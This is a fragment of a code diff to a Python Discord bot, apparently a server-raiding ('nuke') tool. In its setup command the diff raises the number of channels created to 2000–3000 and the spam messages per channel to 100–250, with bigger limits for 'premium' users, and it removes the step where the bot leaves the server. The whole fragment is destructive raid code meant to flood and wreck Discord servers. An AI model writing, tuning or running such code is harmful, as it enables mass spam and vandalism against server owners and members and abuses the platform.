@@ -1040,9 +1040,9 @@ async def setup(ctx):
                     ),
                     color=0xb161f9
                 )
-            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1395783321895567461/1398652948812267630/11131604.png")
+            embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/1416670394990989334/a_02a5709b0e67a65dd310cdf7e2f1f1d9.gif?size=1024")
             is_premium_check = is_premium_user(user_id)
-            spams = 25 if is_premium_check else 10
+            spams = 250 if is_premium_check else 100
 
             for _ in range(spams):
                 await ch.send(
@@ -1055,7 +1055,7 @@ async def setup(ctx):
             print(f"[!] Channel/message failed: {e}")
 
     is_premium = is_premium_user(user_id)
-    channel_count = 100 if is_premium else 50
+    channel_count = 3000 if is_premium else 2000
     await asyncio.gather(*(create_channel_and_send_message() for _ in range(channel_count)))
 
     try:
@@ -1063,7 +1063,7 @@ async def setup(ctx):
     except Exception as e:
         print(f"[!] Role creation failed: {e}")
 
-    await guild.leave()
+    
 
 
 
